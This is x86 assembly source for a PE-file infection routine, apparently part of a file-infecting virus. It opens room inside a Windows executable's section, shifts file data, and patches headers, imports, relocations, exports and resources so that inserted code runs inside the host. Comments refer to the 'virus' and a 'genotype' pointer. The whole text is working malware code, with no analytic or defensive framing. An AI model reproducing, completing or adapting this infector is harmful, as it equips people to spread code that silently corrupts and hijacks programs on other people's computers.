DEBUGOFF

;InsertCode

;eax=section to insert
;ecx=size to add
;edx=file size
;return:
;eax=rva to chunk
;ecx=raw to chunk
;edx=new file size
InsertCode PROC
       pushad

       mov dwo [next_section_start],0

       mov edi, [peheader]
       lea esi, [edi+SIZE IMAGE_NT_HEADERS]

       movzx ebp, [edi.NT_FileHeader.FH_NumberOfSections]
       dec ebp

       cmp by [reloc], TRUE
       je @@has_relocs
DEBUGSTR <File without relocs... Increasing last one>
       mov eax,ebp
  @@has_relocs:

       mov ebx, eax
       shl ebx, 3
       add esi,ebx
       shl ebx, 2
       add esi,ebx                      ;esi==section we will increase

       cmp eax,ebp                      ;we will increase last one?
       je @@increase_last_section

       mov eax, [esi.SH_VirtualSize]
       mov ebx, eax
       add ecx,eax                              ;new virtual_size

       add eax, [esi.SH_VirtualAddress]
       push eax                                 ;rva of start of my chunk

       add ebx, [esi.SH_PointerToRawData]
       push ebx                                 ;raw to start of my chunk
DEBUGSTR <New virtual size=%x rva of insert=%x raw of insert=%x>,ecx,eax,ebx
       xchg eax, ecx

       push eax

       mov ebx, [esi.SH_SizeOfRawData]
DEBUGSTR <Size available=%x Size need=%x>,ebx,eax
       cmp eax, ebx                             ;inserted size fill in pad
       jbe @@no_move

DEBUGSTR <Moving file...>
       sub edx, edx
       mov ebx, [edi.NT_OptionalHeader.OH_FileAlignment]
       dec ebx
       add eax, ebx
       not ebx                                  ;align new physical size
       and eax, ebx

       mov ebx, eax
       sub ebx, [esi.SH_SizeOfRawData]          ;ebx=delta between sections
       mov [esi.SH_SizeOfRawData], eax
DEBUGSTR <New raw size=%x (delta=%x)>,eax,ebx

       mov ecx,ebp
       sub ecx, [esp+(3*4)+(7*4)]      ;ecx==how much sections need update

       push esi
DEBUGSTR <updating %x sections SH_PointerToRawData>,ecx
       sub eax, eax
  @@next_section:
       sub esi, -IMAGE_SIZEOF_SECTION_HEADER
       test eax, eax
       jnz @@skip
       mov edx, esi                          ;first section changed &
       mov eax, [esi.SH_PointerToRawData]    ;where in disk it is
  @@skip:
       cmp [esi.SH_PointerToRawData], 0
       je @@no_body
       add [esi.SH_PointerToRawData], ebx    ;ebx==delta between sections
  @@no_body:
       dec ecx
       jnz @@next_section

       mov ecx, [esp+(4*4)+(5*4)]       ;pushad.edx
       sub ecx, eax                             ;ecx=ammount to move

       xchg eax,esi
  @@retrybss:
       mov edi, [edx.SH_PointerToRawData]
       add edx, IMAGE_SIZEOF_SECTION_HEADER
       test edi,edi                        ;if section dont exists in disk,
       jz @@retrybss                       ;get next

       add esi, ecx
       add edi, ecx
       mov dwo [esp+(4*4)+(5*4)], edi  ;pushad.edx        ;new file size

       add esi, [fmap]
       add edi, [fmap]                      ;map in memory

       inc ecx
DEBUGSTR <moving file from %x to %x (%x bytes)>,esi,edi,ecx

       std
       rep movsb                                ;make hole
       cld
       pop esi                                  ;esi=section header

       inc edi
       mov [next_section_start],edi

  @@no_move:
       pop ebx                  ;ebx==new virtual size
       mov [esi.SH_VirtualSize], ebx

       mov edi, [peheader]
       add ebx, [esi.SH_VirtualAddress]
       mov eax, [edi.NT_OptionalHeader.OH_SectionAlignment]
       dec eax
       add ebx, eax
       not eax                                  ;align new virtual size
       and ebx, eax

       mov edx, [esi.IMAGE_SIZEOF_SECTION_HEADER.SH_VirtualAddress]
       sub ebx, edx
DEBUGSTR <New virtual size=%x (delta=%x)>,edx,ebx
       test ebx, ebx
       jz @@no_fix              ;sections rvas didnt changed...

       mov ecx,ebp
       sub ecx, [esp+(2*4)+(7*4)] ;pushad.eax              ;section we're increasing
       test ecx, ecx
       jz @@no_fix_section                   ;how much sections need update
DEBUGSTR <updating %x sections SH_VirtualAddress>,ecx

  @@next_section2:
       sub esi, -IMAGE_SIZEOF_SECTION_HEADER    ;fix section header RVAs
       mov eax, [esi.SH_VirtualAddress]
       call RVA2RVA
       mov [esi.SH_VirtualAddress], eax
       dec ecx
       jnz @@next_section2

  @@no_fix_section:
DEBUGSTR <fix pe header fields>
       lea esi, [edi.NT_OptionalHeader.OH_AddressOfEntryPoint]
       lodsd
       call RVA2RVA
       mov [esi-4], eax                         ;rva entrypoint
       lodsd
       call RVA2RVA
       mov [esi-4], eax                         ;base of code
       lodsd
       call RVA2RVA
       mov [esi-4], eax                         ;base of data

       add esi, ofs OH_SizeOfImage-ofs OH_ImageBase
       lodsd
       call RVA2RVA
       mov [esi-4], eax                         ;image size

DEBUGSTR <fix directory entries>
       add esi, ofs OH_NumberOfRvaAndSizes-ofs OH_SizeOfHeaders
       lodsd
       mov ecx, eax
       push esi
  @@next_rva:
       lodsd
       call RVA2RVA                             ;fix directory entries RVAs
       mov [esi-4], eax
       lodsd           ;skip directory.size
       dec ecx
       jnz @@next_rva

       pop esi
       lodsd
       lodsd                    ;esi==IMAGE_DIRECTORY_ENTRY_IMPORT

       mov ecx, [fmap]

       lodsd
       push esi
       test eax, eax
       jz @@done_import
DEBUGSTR <*process import table>
       call RVA2RAW                             ;process import table
       add eax, ecx
       xchg eax, esi            ;esi==import directory

  @@next_dll:
       mov eax, [esi.ID_FirstThunk]
       test eax, eax
       jz @@done_import                         ;all dllz done

DEBUGSTR <fixing DLL>
       lodsd                    ;ID_OriginalFirstThunk
       test eax,eax
       jz @@no_org_ft
       call RVA2RVA
       mov [esi-4], eax
       call RVA2RAW
       add eax, ecx
       call RVA4LIST                            ;original firstthunk
  @@no_org_ft:

       lodsd                     ;ID_TimeDateStamp
       lodsd                     ;ID_ForwarderChain
       lodsd
       call RVA2RVA
       mov [esi-4], eax                         ;dll name

       lodsd                     ;ID_FirstThunk
       call RVA2RVA
       mov [esi-4], eax
       call RVA2RAW
       add eax, ecx
       call RVA4LIST                            ;firstthunk

       jmp @@next_dll

  @@done_import:
       mov esi, [esp]                           ;fix relocationz
       add esi, 8+8+8+4
       lodsd
       test eax, eax
       push ecx
       jz @@done_relocs

DEBUGSTR <*process fixup table>
       call RVA2RAW
       lea esi, [eax+ecx]

  @@next_chunk:
       lodsd
       test eax, eax
       jz @@done_relocs
DEBUGSTR <--->
       call RVA2RVA
       mov [esi-4], eax
DEBUGSTR <process block at %x>,eax

       push eax

       lodsd
       sub eax, 8
       shr eax, 1
       mov ecx, eax
DEBUGSTR <do %x relocations in block>,ecx
  @@next_reloc:
       lodsw

       push eax
       and eax, mask RD_RelocType
       cmp ah, 30h                      ;IMAGE_REL_BASED_HIGHLOW
DEBUGSTR <reloc type:%x>,eax
       pop eax
       jne @@invalid_reloc

       push ecx

       and eax, mask RD_RelocOffset
       add eax, [esp+4]                 ;+RVA
       call RVA2RAW
       add eax, [esp+8]                 ;+fmap
       mov edi, eax

       mov ecx, [peheader]
       mov ecx, [ecx.NT_OptionalHeader.OH_ImageBase]

       mov eax, [edi]
       sub eax, ecx
       call RVA2RVA
       add eax, ecx
       mov [edi], eax

       pop ecx

  @@invalid_reloc:
       dec ecx
       jnz @@next_reloc

       pop eax                  ;remove RVA from stack
       jmp @@next_chunk

  @@done_relocs:
       pop ecx                                  ;ecx=fmap

       mov esi, [esp]
       mov eax, [esi-12]                        ;update export table
       test eax, eax
       jz @@done_exports

DEBUGSTR <*process export table>
       call RVA2RAW
       lea esi, [eax+ecx.ED_Name]
       lodsd
       call RVA2RVA
       mov [esi-4], eax         ;ED_Name

       lodsd                                    ;ED_Base(sux)

       lodsd             ;ED_NumberOfFunctions
       push eax
       lodsd             ;ED_NumberOfNames
       xchg [esp], eax                          ;[esp+4]=no of names
       push ecx                                 ;[esp]=fmap
       xchg eax, ecx                            ;ecx=no of functions
DEBUGSTR <UPDATING %x ED_AddressOfFunctions at %x>,ecx,esi
       call DO_LIST

       pop ecx
       xchg ecx, [esp]
DEBUGSTR <UPDATING %x ED_AddressOfOrdinals at %x>,ecx,esi
       call DO_LIST
       pop ecx

  @@done_exports:
       pop esi                                  ;esi=import dir+4
       lodsd
       lodsd                                    ;eax=rva of resources
       push esi
       test eax, eax
       jz @@no_resource
DEBUGSTR <*process resource table>
       mov esi, [peheader]
       lea esi, [esi+SIZE IMAGE_NT_HEADERS+SH_VirtualAddress]

  @@find_resource_section:
       mov edi, eax                     ;eax==resource rva
       sub edi, [esi]                           ;virtual address
       cmp edi, [esi-4]                         ;virtual size
       jb @@found_section
       add esi, IMAGE_SIZEOF_SECTION_HEADER
       dec ebp
       jns @@find_resource_section

  @@found_section:
       mov ecx, [esi+8]                         ;raw data ofs
       mov [resource], ecx
DEBUGSTR <rva of 1st resource at %x raw at %x>,eax,ecx
       call RVA2RAW
       add eax, [fmap]
       call ProcessResource                     ;esi=res dir

  @@no_resource:
       pop esi                                 ;esi=resource dir+4

  @@no_fix:
       pop edi                                  ;edi=raw of inserted chunk
       mov [insert_raw], edi
       pop eax                                  ;eax=rva of inserted chunk
       mov [insert_rva], eax

       mov ecx, [next_section_start]
       jecxz @@skipfill

       add edi,[fmap]
       sub ecx,edi
       sub eax,eax
       rep stosb

  @@skipfill:
       mov eax,[genotype_rva]
       call RVA2RVA
       mov [genotype_rva],eax

       popad
       ret

  @@increase_last_section:
       or dwo [esi.SH_Characteristics],IMAGE_SCN_MEM_READ+\
                                       IMAGE_SCN_MEM_WRITE
       mov eax, [esi.SH_VirtualSize]
       mov edx, [esi.SH_VirtualAddress]
       mov ebx, [esi.SH_PointerToRawData]

       add [esi.SH_VirtualSize], ecx
       add [esi.SH_SizeOfRawData], ecx

       add edx, eax
       add ebx, eax
       push edx                                ;edx==rva 2virus
       push ebx                                ;ebx==raw ptr2virus

       lea eax, [ebx+ecx]                      ;eax==raw end of code
                            mov ecx, [edi.NT_OptionalHeader.OH_FileAlignment]
       mov edx, [esi.SH_SizeOfRawData]
       dec ecx
       add eax, ecx
       add edx, ecx
       not ecx
       and eax, ecx
       and edx, ecx

       mov dwo [esp+(2*4)+(5*4)], eax          ;new file size
       mov [esi.SH_SizeOfRawData], edx         ;new raw size

       jmp @@no_fix
InsertCode ENDP


RVA2RVA PROC
       cmp eax, edx
       jb @@no_fix_neeed
DEBUGSTR <- RVA=%X now RVA=%x+%x>,eax,eax,ebx
       add eax, ebx
  @@no_fix_neeed:
       ret
RVA2RVA ENDP


RVA4LIST PROC
       pushad
       xchg eax,esi             ;esi==list of RVAs
       mov ecx, [peheader]
  @@next_item:
       lodsd
       test eax, eax            ;end of list?
       jz @@done
       bt eax, 31               ;import by ordinal?
       jc @@next_item
       cmp eax, [ecx.NT_OptionalHeader.OH_SizeOfImage]
       ja @@next_item
       call RVA2RVA
       mov [esi-4], eax
       jmp @@next_item

  @@done:
       popad
       ret
RVA4LIST ENDP


DO_LIST PROC
       lodsd
       call RVA2RVA
       mov [esi-4], eax
       call RVA2RAW
       add eax, [esp+4]         ;+fmap
       push esi
       xchg eax,esi
       jecxz @@empty_table
  @@next_function:
       lodsd
       call RVA2RVA
       mov [esi-4], eax
       dec ecx
       jnz @@next_function
  @@empty_table:
       pop esi
       ret
DO_LIST ENDP


ProcessResource PROC
DEBUGSTR <Resource directory found at %x>,eax
       pushad
       lea esi, [eax+12]
       sub eax, eax
       lodsw
       mov ecx, eax
       lodsw
       add ecx, eax
DEBUGSTR <processing resource directory at %x (%X entries)>,esi,ecx
  @@cycle_directory:
       lodsd
       lodsd
       bt eax, 31
       jc @@resource_directory
       add eax, [resource]
       add eax, [fmap]
       push esi
       mov esi, eax
       lodsd
       call RVA2RVA
       mov [esi-4], eax
       pop esi
       jmp @@next_resource_item
  @@resource_directory:
       and eax, 7fffffffh
       add eax, [resource]
       add eax, [fmap]
       call ProcessResource
  @@next_resource_item:
       dec ecx
       jnz @@cycle_directory
       popad
       ret
ProcessResource ENDP
